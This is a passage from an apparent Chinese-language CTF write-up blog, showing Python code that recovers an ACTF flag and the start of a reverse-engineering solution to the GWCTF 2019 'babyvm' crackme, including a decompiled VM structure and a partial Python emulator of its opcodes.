class="number">0xF2</span>, <span class="number">0x1E</span>, <span class="number">0xEB</span>, <span class="number">0x58</span>, <span class="number">0xF1</span>, <span class="number">0x94</span>, <span class="number">0xC3</span>, <span class="number">0x2F</span>, <span class="number">0x56</span>, <span class="number">0xF7</span>, <span class="number">0xE6</span>, <span class="number">0x86</span>, <span class="number">0x47</span>, <span class="number">0xFB</span>, <span class="number">0x83</span>, <span class="number">0x5E</span>, <span class="number">0xCC</span>, <span class="number">0x21</span>, <span class="number">0x4A</span>, <span class="number">0x24</span>, <span class="number">0x07</span>, <span class="number">0x1C</span>, <span class="number">0x8A</span>, <span class="number">0x5A</span>, <span class="number">0x17</span>, <span class="number">0x1B</span>, <span class="number">0xDA</span>, <span class="number">0xEC</span>, <span class="number">0x38</span>, <span class="number">0x0E</span>, <span class="number">0x7E</span>, <span class="number">0xB4</span>, <span class="number">0x48</span>, <span class="number">0x88</span>, <span class="number">0xF4</span>, <span class="number">0xB8</span>, <span class="number">0x27</span>, <span class="number">0x91</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x97</span>, <span class="number">0xBE</span>, <span class="number">0x53</span>, <span class="number">0xC2</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0x1A</span>, <span class="number">0xE9</span>, <span class="number">0x2D</span>, <span class="number">0x14</span>, <span class="number">0x0B</span>, <span class="number">0xBF</span>, <span class="number">0xB5</span>, <span class="number">0x40</span>, <span class="number">0x79</span>, <span class="number">0xD2</span>, <span class="number">0x3E</span>, <span class="number">0x19</span>, <span class="number">0x5D</span>, <span class="number">0xF8</span>, <span class="number">0x69</span>, <span class="number">0x39</span>, <span class="number">0x5F</span>, <span class="number">0xDB</span>, <span class="number">0xFA</span>, <span class="number">0xB2</span>, <span class="number">0x8B</span>, <span class="number">0x6E</span>, <span class="number">0xA2</span>, <span class="number">0xDF</span>, <span class="number">0x16</span>, <span class="number">0xE2</span>, <span class="number">0x63</span>, <span class="number">0xB1</span>, <span class="number">0x20</span>, <span class="number">0xCB</span>, <span class="number">0xBA</span>, <span class="number">0xEE</span>, <span class="number">0x8D</span>, <span class="number">0xAA</span>, <span class="number">0xC8</span>, <span class="number">0xC7</span>, <span class="number">0xC5</span>, <span class="number">0x05</span>, <span class="number">0x66</span>, <span class="number">0x6D</span>, <span class="number">0x3A</span>, <span class="number">0x45</span>, <span class="number">0x72</span>, <span class="number">0x0D</span>, <span class="number">0xCA</span>, <span class="number">0x84</span>, <span class="number">0x4E</span>, <span class="number">0xF5</span>, <span class="number">0x31</span>, <span class="number">0x6B</span>, <span class="number">0x92</span>, <span class="number">0xDC</span>, <span class="number">0xDD</span>, <span class="number">0x9C</span>, <span class="number">0x3F</span>, <span class="number">0x55</span>, <span class="number">0x96</span>, <span class="number">0xA1</span>, <span class="number">0x9F</span>, <span class="number">0xCD</span>, <span class="number">0x9B</span>, <span class="number">0xE3</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xC1</span>, <span class="number">0x78</span>, <span class="number">0x10</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x8F</span>, <span class="number">0x30</span>, <span class="number">0x54</span>, <span class="number">0x04</span>, <span class="number">0xAC</span>, <span class="number">0x41</span>, <span class="number">0x93</span>, <span class="number">0xD3</span>, <span class="number">0x3B</span>, <span class="number">0xEF</span>, <span class="number">0x03</span>, <span class="number">0x81</span>, <span class="number">0x70</span>, <span class="number">0xA6</span>, <span class="number">0x1F</span>, <span class="number">0x22</span>, <span class="number">0x26</span>, <span class="number">0x28</span>, <span class="number">0x6A</span>, <span class="number">0xAB</span>, <span class="number">0x87</span>, <span class="number">0xAD</span>, <span class="number">0x49</span>, <span class="number">0x0F</span>, <span class="number">0xAF</span>]</span><br><span class="line">s3 = [<span class="number">0x30</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x30</span>, <span class="number">0x63</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    t = table.index(s3[i]) ^ (<span class="number">0x83</span> + i)</span><br><span class="line">    flag += <span class="built_in">bytes</span>([t])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">flag += <span class="string">b&quot;_&quot;</span></span><br><span class="line"></span><br><span class="line">flag += <span class="string">b&quot;5mcsM&lt;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&quot;ACTF&#123;&quot;</span> + flag + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h3><p>ida打开，根据分析可以得到如下结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> VM              struc ; (<span class="keyword">sizeof</span>=<span class="number">0x88</span>, mappedto_8)</span><br><span class="line"><span class="number">00000000</span> r0              dd ?</span><br><span class="line"><span class="number">00000004</span> r1              dd ?</span><br><span class="line"><span class="number">00000008</span> r2              dd ?</span><br><span class="line"><span class="number">0000000</span>C r3              dd ?</span><br><span class="line"><span class="number">00000010</span> _ip             dq ?</span><br><span class="line"><span class="number">00000018</span> funs            func <span class="number">7</span> dup(?)</span><br><span class="line"><span class="number">00000088</span> VM              ends</span><br><span class="line"><span class="number">00000088</span></span><br><span class="line"><span class="number">00000000</span> ; ---------------------------------------------------------------------------</span><br><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> func            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_9)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: VM/r</span><br><span class="line"><span class="number">00000000</span> index           db ?</span><br><span class="line"><span class="number">00000001</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000002</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000003</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000004</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000005</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000006</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000007</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000008</span> fun             dq ?</span><br><span class="line"><span class="number">00000010</span> func            ends</span><br></pre></td></tr></table></figure><p>与主要函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input something:&quot;</span>);</span><br><span class="line">  init_VM((VM *)v3);</span><br><span class="line">  run_VM((VM *)v3);</span><br><span class="line">  check();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And the flag is GWHT&#123;true flag&#125;&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>init_VM</code>为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">init_VM</span><span class="params">(VM *vm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vm-&gt;r0 = <span class="number">0</span>;</span><br><span class="line">  vm-&gt;r1 = <span class="number">18</span>;</span><br><span class="line">  vm-&gt;r2 = <span class="number">0</span>;</span><br><span class="line">  vm-&gt;r3 = <span class="number">0</span>;</span><br><span class="line">  vm-&gt;_ip = opcodes;</span><br><span class="line">  vm-&gt;funs[<span class="number">0</span>].index = <span class="number">0xF1</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">0</span>].fun = memory_operate;</span><br><span class="line">  vm-&gt;funs[<span class="number">1</span>].index = <span class="number">0xF2</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">1</span>].fun = xor_r0_r1;</span><br><span class="line">  vm-&gt;funs[<span class="number">2</span>].index = <span class="number">0xF5</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">2</span>].fun = check_flag_length;</span><br><span class="line">  vm-&gt;funs[<span class="number">3</span>].index = <span class="number">0xF4</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">3</span>].fun = inc_ip;</span><br><span class="line">  vm-&gt;funs[<span class="number">4</span>].index = <span class="number">0xF7</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">4</span>].fun = mul_r0_r3;</span><br><span class="line">  vm-&gt;funs[<span class="number">5</span>].index = <span class="number">0xF8</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">5</span>].fun = swap_r0_r1;</span><br><span class="line">  vm-&gt;funs[<span class="number">6</span>].index = <span class="number">0xF6</span>;</span><br><span class="line">  vm-&gt;funs[<span class="number">6</span>].fun = cal;</span><br><span class="line">  memory = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x512</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(memory, <span class="number">0</span>, <span class="number">0x512</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则可写出脚本得到该虚拟机执行流程</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">opcodes = [ <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VM</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, opcodes</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.opcodes = opcodes</span><br><span class="line">        self.r0 = <span class="number">0</span></span><br><span class="line">        self.r1 = <span class="number">18</span></span><br><span class="line">        self.r2 = <span class="number">0</span></span><br><span class="line">        self.r3 = <span class="number">0</span></span><br><span class="line">        self.ip = <span class="number">0</span></span><br><span class="line">        self.memory = [<span class="number">0</span>] * <span class="number">0x512</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">memory_operate</span>(<span class="params">self</span>):</span></span><br><span class="line">        v = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">bytes</span>(self.opcodes[self.ip + <span class="number">2</span>:self.ip + <span class="number">6</span>]))[<span class="number">0</span>]</span><br><span class="line">        op = self.opcodes[self.ip + <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> op == <span class="number">0xE1</span>:</span><br><span class="line">            self.r0 = self.memory[v]</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE2</span>:</span><br><span class="line">            self.r1 = self.memory[v] </span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE3</span>:</span><br><span class="line">            self.r2 = self.memory[v]</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE4</span>:</span><br><span class="line">            self.memory[v] = self.r0</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE5</span>:</span><br><span class="line">            self.r3 = self.memory[v]</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">0xE7</span>:</span><br><span class="line">            self.memory[v] = self.r1</span><br><span class="line">        </span><br><span class="line">        self.ip += <span class="number">6</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> opcodes[self.ip] != <span class="number">0xF4</span>:</span><br><span class="line">            op = opcodes[self.ip]</span><br><span class="line">            <span class="keyword">if</span> op == <span class="number">0xF1</span>:</span><br><span class="line">                self.memory_operate()</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF2</span>:</span><br><span class="line">                self.r0 ^= self.r1</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF5</span>: <span class="comment"># read flag and check flag length</span></span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF4</span>:</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF7</span>:</span><br><span class="line">                self.r0 *= self.r3</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF8</span>:</span><br><span class="line">                self.r0, self.r1 = self.r1, self.r0</span><br><span class="line">                self.ip += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> op == <span class="number">0xF6</span>:</span><br><span class="line">                self.r0 = self.r2 + <span class="number">2</span> * self.r1 + <span class="number">3</span> * 